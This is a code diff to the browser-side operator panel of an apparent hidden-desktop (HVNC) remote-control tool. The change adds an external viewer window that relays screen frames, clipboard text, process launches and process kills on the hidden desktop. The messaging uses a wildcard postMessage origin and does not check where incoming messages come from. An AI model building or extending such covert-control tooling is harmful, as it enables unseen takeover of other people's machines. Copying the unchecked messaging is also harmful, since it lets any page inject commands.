@@ -30,6 +30,18 @@
     },
   };
 
+  // Reference to the external HVNC window (declared early for hoisting)
+  let hvncExternalWindow = null;
+
+  /**
+   * Send message to HVNC external window
+   */
+  function sendToHvncWindow(action, data = {}) {
+    if (hvncExternalWindow && !hvncExternalWindow.closed) {
+      hvncExternalWindow.postMessage({ type: "hvnc_parent", action, ...data }, "*");
+    }
+  }
+
   // DOM Elements for HVNC
   const hvncDom = {
     status: document.getElementById("hvncStatus"),
@@ -141,11 +153,15 @@
         if (success) {
           hvncState.active = true;
           hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
-          setHvncStatus(`HVNC: Active (${hvncState.desktopName})`, "active");
+          const statusMsg = `HVNC: Active (${hvncState.desktopName})`;
+          setHvncStatus(statusMsg, "active");
+          sendToHvncWindow("status", { message: statusMsg, state: "active" });
           // Start preview updates when HVNC starts
           startPreview();
         } else {
-          setHvncStatus(`HVNC: Failed - ${error}`, "error");
+          const statusMsg = `HVNC: Failed - ${error}`;
+          setHvncStatus(statusMsg, "error");
+          sendToHvncWindow("status", { message: statusMsg, state: "error" });
         }
         updateHvncButtons();
         break;
@@ -154,6 +170,7 @@
         hvncState.active = false;
         hvncState.desktopName = null;
         setHvncStatus("HVNC: Stopped", "");
+        sendToHvncWindow("status", { message: "HVNC: Stopped", state: "" });
         updateHvncButtons();
         // Stop preview when HVNC stops
         stopPreview();
@@ -174,12 +191,16 @@
       case "hvnc_run_exe":
       case "hvnc_start_process":
         if (success) {
-          setHvncStatus(`HVNC: Launched ${payload.app || payload.path || "process"}`, "active");
+          const statusMsg = `HVNC: Launched ${payload.app || payload.path || "process"}`;
+          setHvncStatus(statusMsg, "active");
+          sendToHvncWindow("status", { message: statusMsg, state: "active" });
           if (payload.pid) {
             hvncState.processes.push({ pid: payload.pid, name: payload.app || payload.path });
           }
         } else {
-          setHvncStatus(`HVNC: Launch failed - ${error}`, "error");
+          const statusMsg = `HVNC: Launch failed - ${error}`;
+          setHvncStatus(statusMsg, "error");
+          sendToHvncWindow("status", { message: statusMsg, state: "error" });
         }
         break;
 
@@ -187,31 +208,47 @@
         if (success && payload.text !== undefined) {
           // Copy to local clipboard
           navigator.clipboard.writeText(payload.text).then(() => {
-            setHvncStatus("HVNC: Clipboard copied to local", "active");
+            const statusMsg = "HVNC: Clipboard copied to local";
+            setHvncStatus(statusMsg, "active");
+            sendToHvncWindow("status", { message: statusMsg, state: "active" });
           }).catch(() => {
             // Fallback: show in dialog
             prompt("Clipboard content from hidden desktop:", payload.text);
-            setHvncStatus("HVNC: Clipboard retrieved", "active");
+            const statusMsg = "HVNC: Clipboard retrieved";
+            setHvncStatus(statusMsg, "active");
+            sendToHvncWindow("status", { message: statusMsg, state: "active" });
           });
+          // Also send to external window for clipboard handling
+          sendToHvncWindow("clipboard_received", { text: payload.text });
         } else {
-          setHvncStatus(`HVNC: Get clipboard failed - ${error}`, "error");
+          const statusMsg = `HVNC: Get clipboard failed - ${error}`;
+          setHvncStatus(statusMsg, "error");
+          sendToHvncWindow("status", { message: statusMsg, state: "error" });
         }
         break;
 
       case "hvnc_send_clipboard":
         if (success) {
-          setHvncStatus("HVNC: Clipboard sent to hidden desktop", "active");
+          const statusMsg = "HVNC: Clipboard sent to hidden desktop";
+          setHvncStatus(statusMsg, "active");
+          sendToHvncWindow("status", { message: statusMsg, state: "active" });
         } else {
-          setHvncStatus(`HVNC: Send clipboard failed - ${error}`, "error");
+          const statusMsg = `HVNC: Send clipboard failed - ${error}`;
+          setHvncStatus(statusMsg, "error");
+          sendToHvncWindow("status", { message: statusMsg, state: "error" });
         }
         closeAllDialogs();
         break;
 
       case "hvnc_kill_process":
         if (success) {
-          setHvncStatus(`HVNC: Process killed`, "active");
+          const statusMsg = "HVNC: Process killed";
+          setHvncStatus(statusMsg, "active");
+          sendToHvncWindow("status", { message: statusMsg, state: "active" });
         } else {
-          setHvncStatus(`HVNC: Kill failed - ${error}`, "error");
+          const statusMsg = `HVNC: Kill failed - ${error}`;
+          setHvncStatus(statusMsg, "error");
+          sendToHvncWindow("status", { message: statusMsg, state: "error" });
         }
         closeAllDialogs();
         break;
@@ -220,7 +257,9 @@
         if (success && payload.processes) {
           showProcessList(payload.processes);
         } else {
-          setHvncStatus(`HVNC: List processes failed - ${error}`, "error");
+          const statusMsg = `HVNC: List processes failed - ${error}`;
+          setHvncStatus(statusMsg, "error");
+          sendToHvncWindow("status", { message: statusMsg, state: "error" });
         }
         break;
 
@@ -228,13 +267,16 @@
         hvncState.active = payload.active || false;
         if (hvncState.active) {
           hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
-          setHvncStatus(`HVNC: Active (${hvncState.desktopName})`, "active");
+          const statusMsg = `HVNC: Active (${hvncState.desktopName})`;
+          setHvncStatus(statusMsg, "active");
+          sendToHvncWindow("status", { message: statusMsg, state: "active" });
           // Start preview if not already active
           if (!hvncState.previewActive) {
             startPreview();
           }
         } else {
           setHvncStatus("HVNC: Not active", "");
+          sendToHvncWindow("status", { message: "HVNC: Not active", state: "" });
           stopPreview();
         }
         updateHvncButtons();
@@ -260,7 +302,7 @@
   }
 
   /**
-   * Update HVNC preview image (both in-panel and popup window)
+   * Update HVNC preview image (both in-panel and external popup window)
    */
   function updatePreviewImage(imageData) {
     const src = imageData 
@@ -283,7 +325,7 @@
       }
     }
     
-    // Update popup window screen
+    // Update internal popup window screen (if exists - for backward compatibility)
     if (hvncDom.screenImg) {
       if (src) {
         hvncDom.screenImg.src = src;
@@ -297,6 +339,11 @@
           hvncDom.screenPlaceholder.classList.remove("hidden");
         }
       }
+    }
+
+    // Send frame to external HVNC window
+    if (hvncExternalWindow && !hvncExternalWindow.closed && imageData) {
+      sendToHvncWindow("frame", { frame: imageData });
     }
   }
 
@@ -365,32 +412,172 @@
   }
 
   /**
-   * Show HVNC popup window
+   * Check if running in PyQt6 WebEngine (desktop app) or browser
+   */
+  function isDesktopApp() {
+    return typeof qt !== 'undefined' || 
+           (typeof window.remdeskHost !== 'undefined') ||
+           (typeof QWebChannel !== 'undefined');
+  }
+
+  /**
+   * Get session ID from state or URL
+   */
+  function getSessionId() {
+    if (state && state.sessionId) return state.sessionId;
+    const params = new URLSearchParams(window.location.search);
+    return params.get('session_id') || 'unknown';
+  }
+
+  /**
+   * Show HVNC popup window - opens as a separate window
+   * Uses QWebChannel for PyQt6 desktop app, window.open for browser
    */
   function showHvncWindow() {
-    if (hvncDom.window) {
-      hvncDom.window.style.display = "flex";
+    // Check if window already exists and is open
+    if (hvncExternalWindow && !hvncExternalWindow.closed) {
+      hvncExternalWindow.focus();
+      return;
+    }
+
+    const sessionId = getSessionId();
+
+    // Try PyQt6 QWebChannel first (desktop app)
+    if (isDesktopApp() && window.remdeskHost && window.remdeskHost.openHvncWindow) {
+      console.log("Opening HVNC window via QWebChannel");
+      window.remdeskHost.openHvncWindow("hidden", sessionId);
       hvncState.windowOpen = true;
       
       // Start HVNC if not already active
       if (!hvncState.active) {
         startHvnc();
       } else {
-        // Just start preview if HVNC already active
         startPreview();
+      }
+      return;
+    }
+
+    // Fallback to window.open for browser
+    const width = 850;
+    const height = 600;
+    const left = (screen.width - width) / 2;
+    const top = (screen.height - height) / 2;
+
+    hvncExternalWindow = window.open(
+      "hvnc_window.html",
+      "HVNCWindow",
+      `width=${width},height=${height},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,resizable=yes`
+    );
+
+    if (hvncExternalWindow) {
+      hvncState.windowOpen = true;
+      
+      if (!hvncState.active) {
+        startHvnc();
+      } else {
+        startPreview();
+      }
+    } else {
+      console.error("Failed to open HVNC window - popup may be blocked");
+      // In desktop app, try QWebChannel as last resort
+      if (isDesktopApp()) {
+        console.log("Retrying via QWebChannel...");
+        // Wait for QWebChannel to initialize
+        setTimeout(() => {
+          if (window.remdeskHost && window.remdeskHost.openHvncWindow) {
+            window.remdeskHost.openHvncWindow("hidden", sessionId);
+            hvncState.windowOpen = true;
+            if (!hvncState.active) startHvnc();
+          } else {
+            setHvncStatus("HVNC: Window open failed", "error");
+          }
+        }, 500);
+      } else {
+        alert("Failed to open HVNC window. Please allow popups for this site.");
       }
     }
   }
 
   /**
-   * Hide HVNC popup window
+   * Hide/close HVNC popup window
    */
   function hideHvncWindow() {
-    if (hvncDom.window) {
-      hvncDom.window.style.display = "none";
-      hvncState.windowOpen = false;
+    if (hvncExternalWindow && !hvncExternalWindow.closed) {
+      hvncExternalWindow.close();
+    }
+    hvncExternalWindow = null;
+    hvncState.windowOpen = false;
+  }
+
+  /**
+   * Called by PyQt when HVNC window is opened
+   */
+  function _onWindowOpened(windowType, sessionId) {
+    console.log(`HVNC window opened: ${windowType} for session ${sessionId}`);
+    hvncState.windowOpen = true;
+    
+    // Start HVNC if not active
+    if (!hvncState.active) {
+      startHvnc();
+    } else {
+      startPreview();
     }
   }
+
+  /**
+   * Called by PyQt when HVNC window is closed
+   */
+  function _onWindowClosed(windowType) {
+    console.log(`HVNC window closed: ${windowType}`);
+    hvncState.windowOpen = false;
+  }
+
+  /**
+   * Handle messages from HVNC external window (browser mode)
+   */
+  function handleHvncWindowMessage(event) {
+    const data = event.data;
+    if (!data || data.type !== "hvnc_window") return;
+
+    switch (data.action) {
+      case "ready":
+        sendToHvncWindow("settings", { settings: hvncState.settings });
+        if (hvncState.active) {
+          sendToHvncWindow("status", { 
+            message: `HVNC: Active (${hvncState.desktopName})`, 
+            state: "active" 
+          });
+        }
+        break;
+
+      case "action":
+        if (data.hvncAction) {
+          const payload = { ...data };
+          delete payload.type;
+          delete payload.action;
+          delete payload.hvncAction;
+          sendHvncAction(data.hvncAction, payload);
+        }
+        break;
+
+      case "settings_changed":
+        if (data.setting && data.value !== undefined) {
+          hvncState.settings[data.setting] = data.value;
+          if (data.setting === "interval") {
+            updatePreviewInterval(data.value);
+          }
+        }
+        break;
+
+      case "closed":
+        hvncExternalWindow = null;
+        hvncState.windowOpen = false;
+        break;
+    }
+  }
+
+  // Listen for messages from HVNC window (browser mode)
+  window.addEventListener("message", handleHvncWindowMessage);
 
   /**
    * Update screen status text
@@ -764,6 +951,10 @@
     updatePreviewImage: updatePreviewImage,
     showWindow: showHvncWindow,
     hideWindow: hideHvncWindow,
+    // Internal callbacks for PyQt integration
+    _onWindowOpened: _onWindowOpened,
+    _onWindowClosed: _onWindowClosed,
+    isDesktopApp: isDesktopApp,
   };
 
   // Auto-init when DOM is ready
